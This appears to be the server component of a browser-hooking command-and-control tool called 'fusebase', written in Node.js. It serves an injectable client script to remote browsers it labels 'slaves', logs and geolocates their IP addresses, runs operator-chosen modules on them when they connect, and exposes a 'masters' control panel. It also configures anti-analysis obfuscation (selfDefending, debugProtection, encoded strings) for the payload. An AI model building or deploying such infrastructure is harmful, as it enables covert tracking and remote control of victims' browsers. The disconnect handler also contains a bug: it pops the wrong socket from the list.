const request = require("request");
const path = require("path");
const fs = require("fs");
const os = require("os");

const express = require("express");

const ipaddr = require('ipaddr.js');
const nodeCleanup = require("node-cleanup");
const obfuscator = require("javascript-obfuscator")

const Modules = require("./Modules.js");

let app = express();
let http = require("http").createServer(app);
let io = require("socket.io")(http);

let control_panel_path = path.join(__dirname, "..", "node_modules", "fusebase-controlpanel");
let client_path = path.join(__dirname, "..", "node_modules", "fusebase-client", "src");

const package = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "package.json")));
const version = package.version;

let clientSrc = fs.readFileSync(path.join(client_path, "client.js"));

let localIps = ["::1"];

let slaveSockets = [];

const defaultModuleSettings = {
	onConnectModules: []
};

const defaultServerSettings = {
	port: 8080,
	externalPort: 8080,
	host: "localhost",
	obfuscatorOptions: {
		compact: true,
		controlFlowFlattening: false,
		controlFlowFlatteningThreshold: 0.75,
		deadCodeInjection: true,
		deadCodeInjectionThreshold: 0.4,
		debugProtection: true,
		debugProtectionInterval: true,
		disableConsoleOutput: false,
		domainLock: [],
		identifierNamesGenerator: "hexadecimal",
		identifiersPrefix: "",
		inputFileName: "",
		log: false,
		renameGlobals: true,
		reservedNames: [],
		reservedStrings: [],
		rotateStringArray: true,
		seed: 0,
		selfDefending: true,
		sourceMap: false,
		sourceMapBaseUrl: "",
		sourceMapFileName: "",
		sourceMapMode: "separate",
		stringArray: true,
		stringArrayEncoding: "rc4",
		stringArrayThreshold: 0.75,
		target: "browser",
		transformObjectKeys: true,
		unicodeEscapeSequence: true
	}
};

let moduleSettings = { ...defaultModuleSettings };
let serverSettings = { ...defaultServerSettings };

// Get ips of the server
Object.values(os.networkInterfaces()).forEach((iface) => {
	iface.forEach((addr) => {
		if (addr.internal !== false) {
			// skip over internal (i.e. 127.0.0.1) and non-ipv4 addresses
			return;
		}

		localIps.push(addr.address);
	});
});

let mod = {
	onModuleConfigChange(module, config, def) {
		(!def ? moduleSettings : defaultModuleSettings)[module.name] = config;
		if (!def) saveSettings();
	},
	getModuleSettings() {
		return moduleSettings;
	}
};
Modules.importModules(mod);


app.use("/", express.static(control_panel_path));

app.get("/client/client.js", (req, res) => {
	let payload = `window.nodeJsIp='${serverSettings.host}:${serverSettings.externalPort}';` + clientSrc;

	//res.send(obfuscator.obfuscate(payload, serverSettings.obfuscatorOptions).getObfuscatedCode());
	res.send(payload);
});
app.use("/client", express.static(client_path));

Modules.getAllModules().forEach(module => {
	if (module.widgetPaths[0]) {
		app.use("/" + module.name, express.static(path.resolve(path.parse(module.widgetPaths[0]).dir)));
	}
});

io.origins((_, c) => c(null, true));

let slaves = io.of("/slaves");
let masters = io.of("/masters");

slaves.on("connect", (socket) => {
	socket.ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress);
	
	// Convert ipv4 "mapped" to ipv6 ips to ipv4
	let ipP = ipaddr.parse(socket.ip);
	if (ipP.range() == "ipv4Mapped") socket.ip = ipP.toIPv4Address().toString();

	if (localIps.includes(socket.ip)) socket.ip = "localhost";

	slaveSockets.push(socket);

	socket.once("postConnection", (platform) => {
		request("http://www.geoplugin.net/json.gp?ip=" + socket.ip, (error, response, body) => {
			if (body[0] === 'u') console.log(body);
			let json = JSON.parse(body);
	
			socket.country = json["geoplugin_countryName"];
			socket.platform = platform;

			masters.emit("slaveUpdate");

			moduleSettings.onConnectModules.forEach((name) => {
				console.log(name)
				let module = Modules.getModule(name);
				if (module) module.exec(socket);
			});
		});
		console.log(platform)
	})

	socket.on("disconnect", () => {
		if (slaveSockets.indexOf(socket) != -1) {
			slaveSockets.pop(socket);

			masters.emit("slaveUpdate");
			console.log("Slave disconnected (" + socket.ip + ")");
		}
	});

	console.log("New slave connection from: " + socket.ip);
});

masters.on("connect", (socket) => {
	socket.ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress);

	if (localIps.includes(socket.ip)) socket.ip = "localhost";

	socket.on("fetchSlaves", () => {

		let data = slaveSockets.map((socket) => {
			return {
				ip: socket.ip,
				country: socket.country,
				platform: socket.platform
			};
		})

		socket.emit("fetchSlavesResponse", data);
	});

	socket.on("fetchModules", () => {

		let modules = Modules.getAllModules().map((module) => {
			return module;
		})

		socket.emit("fetchModulesResponse", {modules, settings: moduleSettings});
	});

	socket.on("updateModuleSettings", (data) => {
		moduleSettings = Object.assign(moduleSettings, data);
		saveSettings();
		socket.emit("updateModules");
	});

	socket.on("shutdown", () => {
		process.exit();
	});

	Modules.getAllModules().forEach(module => {
		module.controlPanelEvents.forEach(event => {
			socket.on(event.name, data => {
				event.function(data, socket, slaveSockets);
			});
		});
	});

	console.log("New master connection from: " + socket.ip);
})

function onShutdown(exitCode, signal) {
	console.log("Shutdown!");
}

function saveSettings(callback) {

	moduleSettings = Object.assign(defaultModuleSettings, moduleSettings);
	serverSettings = Object.assign(defaultServerSettings, serverSettings);

	let modulesSettingsJson = JSON.stringify(moduleSettings, null, "\t");
	fs.writeFile("moduleSettings.json", modulesSettingsJson, () => {

		let serverSettingsJson = JSON.stringify(serverSettings, null, "\t");
		fs.writeFileSync("serverSettings.json", serverSettingsJson);

		if (callback) callback();
	});

}

function loadSettings(callback) {
	try {
		if (fs.existsSync("moduleSettings.json")) {
			let data = fs.readFileSync("moduleSettings.json");

			moduleSettings = JSON.parse(data);
		}
		if (fs.existsSync("serverSettings.json")) {
			let data = fs.readFileSync("serverSettings.json");

			serverSettings = JSON.parse(data);
		}
	} catch (e) {
		console.error("Invalid JSON:", e);
	}
	saveSettings();

	if (callback) callback();
}

loadSettings(() => {

	if (process.env.PORT) serverSettings.port = process.env.PORT;
	if (process.env.EXTERNAL_PORT) serverSettings.externalPort = process.env.EXTERNAL_PORT;
	if (process.env.HOST) serverSettings.host = process.env.HOST;

	http.listen(serverSettings.port, () => {
		console.log(`Listening on *:${serverSettings.externalPort}`);
		console.log(`Control panel: ${serverSettings.host.match("http.*://") ? serverSettings.host : `http://${serverSettings.host}`}:${serverSettings.externalPort}/`);

		nodeCleanup(onShutdown);
	});

});

